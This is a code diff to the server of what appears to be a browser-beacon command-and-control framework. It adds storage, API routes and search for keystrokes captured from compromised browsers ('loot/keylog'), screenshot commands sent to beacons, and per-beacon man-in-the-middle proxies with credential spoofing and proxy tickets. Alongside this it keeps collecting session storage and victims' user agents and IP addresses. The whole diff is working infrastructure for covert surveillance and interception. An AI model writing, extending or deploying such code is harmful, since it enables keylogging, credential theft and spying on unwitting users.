@@ -343,7 +343,8 @@ class Client(Base):
     receiveKey      = Column(String(44), nullable=True)
     sendKey         = Column(String(44), nullable=True)
     cryptoActive    = Column(Boolean, nullable=False, default=False) # Client confirmed it can use keys (HTTPS)
-    sidecarAvailable = Column(Boolean, nullable=False, default=False) # Sidecar native messaging host connected
+    sidecarSupported = Column(Boolean, nullable=False, default=False) # Sidecar support built into extension
+    sidecarConnected = Column(Boolean, nullable=False, default=False) # Sidecar native host currently connected
     rawUserAgent    = Column(Text, nullable=True)
 
     def update(self):
@@ -482,6 +483,15 @@ class SessionStorage(Base):
     key       = Column(Text, nullable=False)
     value     = Column(Text, nullable=False)
     timeStamp = Column(DateTime(timezone=True), server_default=func.now())
+
+class Keylog(Base):
+    __tablename__  = 'keylogs'
+    id             = Column(Integer, primary_key=True)
+    clientID       = Column(String(100), nullable=False)
+    keys           = Column(Text, nullable=False)
+    target         = Column(Text, nullable=True)
+    url            = Column(Text, nullable=True)
+    timeStamp      = Column(DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
         return f'<SessionStorage {self.id}>'
@@ -1042,17 +1052,15 @@ def clientSeen(identifier, ip, userAgent):
     # logger.info("!! Client seen: " + str(ip) + ', ' + userAgent)
     # logger.info("*** Starting clientSeen Update!")
 
-    parsedUserAgent = parse(userAgent)
-    # logger.info("--Browser: " + parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string)
-    # logger.info("--Platform: " + parsedUserAgent.os.family)
-
-
     # DB commit is handled by caller to clientSeen() method, don't do it here
     client = Client.query.filter_by(uuid=identifier).first()
-    client.ipAddress    = ip
-    client.platform     = parsedUserAgent.os.family
-    client.browser      = parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string
-    client.rawUserAgent = userAgent
+    client.ipAddress = ip
+
+    if userAgent:
+        parsedUserAgent = parse(userAgent)
+        client.platform     = parsedUserAgent.os.family
+        client.browser      = parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string
+        client.rawUserAgent = userAgent
 
     # update method touches the database lastseen timestamp
     client.update()
@@ -1547,7 +1555,7 @@ def keyExchange(identifier):
 
     encryptionData = {}
 
-    if appSettings.obfuscateTraffic or (client and client.clientType == 'bex-beacon'):
+    if appSettings.obfuscateTraffic or (client and client.clientType in ('bex-beacon', 'atom-beacon')):
         # Generate AES keys if they don't exist yet for this session
         if client.receiveKey is None or client.sendKey is None:
             receiveKey = os.urandom(32)
@@ -1678,6 +1686,12 @@ def receiveEncryptedMessage(identifier):
         sessionStorageValue = jsonData['value']
         saveSessionStorage(identifier, sessionStorageKey, sessionStorageValue, ip, userAgent)
 
+    elif path.decode('utf-8') == "/loot/keylog":
+        logger.info("Received encrypted keylog message")
+        jsonData = json.loads(message.decode('utf-8'))
+        saveKeylog(identifier, jsonData.get('keys', ''), jsonData.get('target', ''),
+                   jsonData.get('url', ''), ip, userAgent)
+
     elif path.decode('utf-8') == "/loot/xhrRequest":
         logger.info("Received encrypted xhrRequest message")
         jsonData = json.loads(message.decode('utf-8'))
@@ -1742,12 +1756,28 @@ def receiveEncryptedMessage(identifier):
         logger.info("Received encrypted task check request message")
         return createTaskResponse(identifier)
 
+    elif path.decode('utf-8') == "/beacon/status":
+        logger.info("Received beacon status update")
+        jsonData = json.loads(message.decode('utf-8'))
+        client = Client.query.filter_by(uuid=identifier).first()
+        if client:
+            client.sidecarSupported = jsonData.get('supported', False)
+            # Atom-beacon has built-in capabilities — treat as always connected
+            if client.clientType == 'atom-beacon':
+                client.sidecarConnected = client.sidecarSupported
+            elif 'connected' in jsonData:
+                client.sidecarConnected = jsonData.get('connected', False)
+            client.lastSeen = datetime.datetime.now(datetime.timezone.utc)
+            dbCommit()
+
     elif path.decode('utf-8') == "/bex/sidecar/status":
         logger.info("Received sidecar status update")
         jsonData = json.loads(message.decode('utf-8'))
         client = Client.query.filter_by(uuid=identifier).first()
         if client:
-            client.sidecarAvailable = jsonData.get('available', False)
+            client.sidecarSupported = jsonData.get('supported', False)
+            if 'connected' in jsonData:
+                client.sidecarConnected = jsonData.get('connected', False)
             dbCommit()
 
     elif path.decode('utf-8') == "/bex/sidecar/result":
@@ -2017,17 +2047,30 @@ def sendSidecarCommand():
         client = Client.query.filter_by(uuid=beaconID_raw).first()
     if not client:
         return "Client not found", 404
-    if not client.sidecarAvailable:
-        return "Sidecar not available for this beacon", 400
+    if not client.sidecarSupported:
+        return "Sidecar not supported by this beacon", 400
 
     requestId = str(uuid.uuid4())
 
-    taskData = {
-        "type": "SIDECAR_COMMAND",
-        "requestId": requestId,
-        "command": command,
-        "args": args
-    }
+    if command == 'screenshot':
+        taskData = {
+            "type": "SCREENSHOT",
+            "requestId": requestId,
+            "args": args
+        }
+    elif command == 'screenshot_settings':
+        taskData = {
+            "type": "SCREENSHOT_SETTINGS",
+            "requestId": requestId,
+            "args": args
+        }
+    else:
+        taskData = {
+            "type": "SIDECAR_COMMAND",
+            "requestId": requestId,
+            "command": command,
+            "args": args
+        }
     jsonStr = json.dumps(taskData)
     encoded = base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8')
     newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=encoded)
@@ -2172,7 +2215,7 @@ def saveScreenshot(identifier, image, ip, userAgent):
         binary_file.close()
 
     # Put it in the DB
-    newScreenshot = Screenshot(clientID=identifier, fileName="./lootFiles/" + lootDir + "/" + imageName + "_Screenshot.png")
+    newScreenshot = Screenshot(clientID=identifier, fileName="/lootFiles/" + lootDir + "/" + imageName + "_Screenshot.png")
     db_session.add(newScreenshot)
 
     clientSeen(identifier, ip, userAgent)
@@ -2469,10 +2512,23 @@ def saveSessionStorage(identifier, sessionStorageKey, sessionStorageValue, ip, u
 
     # add to global event table
     db_session.refresh(newSessionStorage)
-    newEvent  = Event(clientID=identifier, timeStamp=newSessionStorage.timeStamp, 
+    newEvent  = Event(clientID=identifier, timeStamp=newSessionStorage.timeStamp,
     eventType ='SESSIONSTORAGE', eventID=newSessionStorage.id)
     db_session.add(newEvent)
-    dbCommit()    
+    dbCommit()
+
+
+def saveKeylog(identifier, keys, target, url, ip, userAgent):
+    newKeylog = Keylog(clientID=identifier, keys=keys, target=target or '', url=url or '')
+    db_session.add(newKeylog)
+    clientSeen(identifier, ip, userAgent)
+    dbCommit()
+
+    db_session.refresh(newKeylog)
+    newEvent = Event(clientID=identifier, timeStamp=newKeylog.timeStamp,
+        eventType='KEYLOG', eventID=newKeylog.id)
+    db_session.add(newEvent)
+    dbCommit()
 
 
 
@@ -2483,8 +2539,8 @@ def recordSessionStorageEntry(identifier):
     # logger.info("New sessionStorage data recorded from: " + identifier)
     if not isClientSessionValid(identifier):
         return "No.", 401
- 
-    content = request.json 
+
+    content = request.json
     sessionStorageKey   = content['key']
     sessionStorageValue = content['value']
 
@@ -2497,6 +2553,24 @@ def recordSessionStorageEntry(identifier):
 
     saveSessionStorage(identifier, sessionStorageKey, sessionStorageValue, ip, request.headers.get('User-Agent'))
 
+
+    return "ok", 200
+
+
+@app.route('/loot/keylog/<identifier>', methods=['POST'])
+def recordKeylog(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+    content = request.json
+
+    if proxyMode:
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    saveKeylog(identifier, content.get('keys', ''), content.get('target', ''),
+               content.get('url', ''), ip, request.headers.get('User-Agent'))
 
     return "ok", 200
 
@@ -2821,7 +2895,8 @@ def getClients():
             'isStarred': client.isStarred,
             'hasJobs': client.hasJobs,
             'fingerprint': client.fingerprint,
-            'sidecarAvailable': client.sidecarAvailable
+            'sidecarSupported': client.sidecarSupported,
+            'sidecarConnected': client.sidecarConnected
         })
 
     return jsonify(allClients)
@@ -2947,6 +3022,7 @@ def getBexTicket(domainID):
 
     ticket = {
         'version': 1,
+        'type': 'clone',
         'generated': datetime.datetime.utcnow().isoformat() + 'Z',
         'domain': domain.domain,
         'userAgent': client.rawUserAgent or '',
@@ -2966,8 +3042,10 @@ def getBexTicket(domainID):
 # Bex Proxy — WebSocket + management API
 # ---------------------------------------------------------------------------
 from proxy.server import (
-    register_ws, unregister_ws, deliver_response, start_proxy, stop_proxy,
-    is_proxy_running, get_active_beacon, set_active_beacon, has_ws_connection,
+    register_ws, unregister_ws, deliver_response,
+    start_proxy_for_beacon, stop_proxy_for_beacon, stop_all_proxies,
+    get_proxy_instance, get_all_proxy_instances, is_proxy_running_for,
+    is_proxy_running, has_ws_connection,
     set_spoof_config, get_spoof_config,
 )
 from proxy.certs import CA_CERT_PATH
@@ -3018,7 +3096,6 @@ def proxy_websocket(ws, session_uuid):
 def startProxy():
     content = request.json
     beaconID_raw = content.get('beaconID')
-    port = content.get('port', 8445)
 
     client = Client.query.filter_by(id=beaconID_raw).first()
     if not client:
@@ -3028,11 +3105,10 @@ def startProxy():
 
     beacon_uuid = client.uuid
 
-    # Start the MITM proxy server if not already running
-    if not is_proxy_running():
-        start_proxy(port=port)
-
-    set_active_beacon(beacon_uuid)
+    # Start (or return existing) proxy instance for this beacon
+    inst = start_proxy_for_beacon(beacon_uuid)
+    if not inst:
+        return jsonify({'error': 'Failed to start proxy (no available ports)'}), 500
 
     # Queue a PROXY_START task for the beacon so it opens a WebSocket back to us
     taskData = {
@@ -3044,11 +3120,12 @@ def startProxy():
     db_session.add(newJob)
     dbCommit()
 
-    logger.info(f"Proxy: Started for beacon {beacon_uuid} on port {port}")
+    logger.info(f"Proxy: Started for beacon {beacon_uuid} on port {inst.port}")
     return jsonify({
         'status': 'started',
-        'port': port,
+        'port': inst.port,
         'beaconID': beacon_uuid,
+        'authToken': inst.auth_token,
         'caCertPath': CA_CERT_PATH,
     })
 
@@ -3056,46 +3133,93 @@ def startProxy():
 @app.route('/api/proxy/stop', methods=['POST'])
 @login_required
 def stopProxy():
-    beacon_uuid = get_active_beacon()
+    content = request.json or {}
+    beaconID_raw = content.get('beaconID')
 
-    if beacon_uuid:
-        # Queue a PROXY_STOP task
-        client = Client.query.filter_by(uuid=beacon_uuid).first()
-        if client:
-            taskData = {"type": "PROXY_STOP"}
-            jsonStr = json.dumps(taskData)
-            newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0,
-                                      code=base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8'))
-            db_session.add(newJob)
-            dbCommit()
+    if not beaconID_raw:
+        return jsonify({'error': 'beaconID required'}), 400
 
-    stop_proxy()
-    return jsonify({'status': 'stopped'})
+    client = Client.query.filter_by(id=beaconID_raw).first()
+    if not client:
+        client = Client.query.filter_by(uuid=beaconID_raw).first()
+    if not client:
+        return jsonify({'error': 'Client not found'}), 404
+
+    beacon_uuid = client.uuid
+
+    # Queue a PROXY_STOP task for the beacon
+    taskData = {"type": "PROXY_STOP"}
+    jsonStr = json.dumps(taskData)
+    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0,
+                              code=base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8'))
+    db_session.add(newJob)
+    dbCommit()
+
+    stop_proxy_for_beacon(beacon_uuid)
+    return jsonify({'status': 'stopped', 'beaconID': beacon_uuid})
 
 
 @app.route('/api/proxy/status', methods=['GET'])
 @login_required
 def proxyStatus():
-    beacon_uuid = get_active_beacon()
-    return jsonify({
-        'running': is_proxy_running(),
-        'beaconID': beacon_uuid,
-        'wsConnected': has_ws_connection(beacon_uuid) if beacon_uuid else False,
-        'spoofConfig': get_spoof_config(beacon_uuid) if beacon_uuid else {},
-    })
+    beaconID_raw = request.args.get('beaconID')
+
+    if beaconID_raw:
+        # Status for a specific beacon
+        client = Client.query.filter_by(id=beaconID_raw).first()
+        if not client:
+            client = Client.query.filter_by(uuid=beaconID_raw).first()
+        if not client:
+            return jsonify({'error': 'Client not found'}), 404
+
+        beacon_uuid = client.uuid
+        inst = get_proxy_instance(beacon_uuid)
+        return jsonify({
+            'running': inst is not None and inst.running,
+            'beaconID': beacon_uuid,
+            'port': inst.port if inst else None,
+            'authToken': inst.auth_token if inst else None,
+            'wsConnected': has_ws_connection(beacon_uuid),
+            'spoofConfig': get_spoof_config(beacon_uuid),
+        })
+    else:
+        # Summary of all running proxies
+        instances = get_all_proxy_instances()
+        proxies = []
+        for beacon_uuid, inst in instances.items():
+            proxies.append({
+                'beaconID': beacon_uuid,
+                'port': inst.port,
+                'wsConnected': has_ws_connection(beacon_uuid),
+            })
+        return jsonify({
+            'running': len(proxies) > 0,
+            'proxies': proxies,
+        })
 
 
 @app.route('/api/proxy/spoof', methods=['POST'])
 @login_required
 def setProxySpoof():
-    """Toggle credential spoofing for a domain on the active proxy beacon."""
+    """Toggle credential spoofing for a domain on a proxy beacon."""
     content = request.json
     domain = content.get('domain')
     enabled = content.get('enabled', True)
+    beaconID_raw = content.get('beaconID')
 
-    beacon_uuid = get_active_beacon()
-    if not beacon_uuid:
-        return jsonify({'error': 'No active proxy'}), 400
+    if not beaconID_raw:
+        return jsonify({'error': 'beaconID required'}), 400
+
+    client = Client.query.filter_by(id=beaconID_raw).first()
+    if not client:
+        client = Client.query.filter_by(uuid=beaconID_raw).first()
+    if not client:
+        return jsonify({'error': 'Client not found'}), 404
+
+    beacon_uuid = client.uuid
+
+    if not is_proxy_running_for(beacon_uuid):
+        return jsonify({'error': 'No active proxy for this beacon'}), 400
 
     set_spoof_config(beacon_uuid, domain, enabled)
 
@@ -3147,6 +3271,51 @@ def _build_spoof_payload(beacon_uuid):
         payload[domain] = entry
 
     return payload
+
+
+@app.route('/api/bex/proxy_ticket/<beaconID>', methods=['GET'])
+@login_required
+def getBexProxyTicket(beaconID):
+    """Generate a proxy ticket for BEX Conductor. Only available when proxy is active."""
+    client = Client.query.filter_by(id=beaconID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=beaconID).first()
+    if not client:
+        return jsonify({'error': 'Client not found'}), 404
+
+    beacon_uuid = client.uuid
+    inst = get_proxy_instance(beacon_uuid)
+    if not inst or not inst.running:
+        return jsonify({'error': 'No active proxy for this beacon'}), 400
+
+    # Get domains for this beacon
+    domains = BeaconDomain.query.filter_by(clientID=beacon_uuid).all()
+    domain_list = [d.domain for d in domains]
+
+    # Derive proxy host from the operator's request Host header
+    proxy_host = request.host.split(':')[0]
+
+    # Get beacon nickname (if set)
+    beacon_nickname = client.nickname or ''
+
+    ticket = {
+        'version': 1,
+        'type': 'proxy',
+        'generated': datetime.datetime.utcnow().isoformat() + 'Z',
+        'beaconNickname': beacon_nickname,
+        'proxy': {
+            'host': proxy_host,
+            'port': inst.port,
+            'username': 'proxy',
+            'password': inst.auth_token,
+        },
+        'domains': domain_list,
+        'userAgent': client.rawUserAgent or '',
+        'platform': client.platform or '',
+        'browser': client.browser or '',
+    }
+
+    return jsonify(ticket)
 
 
 @app.route('/api/proxy/ca_cert', methods=['GET'])
@@ -3275,14 +3444,21 @@ def getClientLocalStorage(key):
 @login_required
 def getClientSesssionStorage(key):
     sessionStorage = SessionStorage.query.filter_by(id=key).first()
-    
+
     sessionStorageData = {'sessionStorageKey':sessionStorage.key, 'sessionStorageValue':sessionStorage.value}
-    
+
 
     return jsonify(sessionStorageData)
 
 
- 
+@app.route('/api/clientKeylog/<key>', methods=['GET'])
+@login_required
+def getClientKeylog(key):
+    keylog = Keylog.query.filter_by(id=key).first()
+
+    keylogData = {'keys': keylog.keys, 'target': keylog.target or '', 'url': keylog.url or ''}
+
+    return jsonify(keylogData)
 
 
 @app.route('/api/clientXhrApiCall/<key>', methods=['GET'])
@@ -3565,7 +3741,7 @@ def getAllClientNotes():
         }
 
         # Include domains for beacon clients
-        if client.clientType == 'bex-beacon':
+        if client.clientType in ('bex-beacon', 'atom-beacon'):
             domains = BeaconDomain.query.filter_by(clientID=client.uuid).all()
             entry['domains'] = [d.domain for d in domains]
 
@@ -4473,6 +4649,23 @@ def lootSearch():
                     'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
                     '_ts': r.timeStamp,
                     'fields': {'Key': r.key, 'Value': r.value}
+                })
+
+    # KEYLOG
+    if 'KEYLOG' in eventTypes:
+        q = Keylog.query.filter(Keylog.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(or_(like_filter(Keylog.keys), like_filter(Keylog.target), like_filter(Keylog.url)))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'KEYLOG',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'Keystrokes': r.keys, 'Target': r.target, 'URL': r.url}
                 })
 
     # URLVISITED
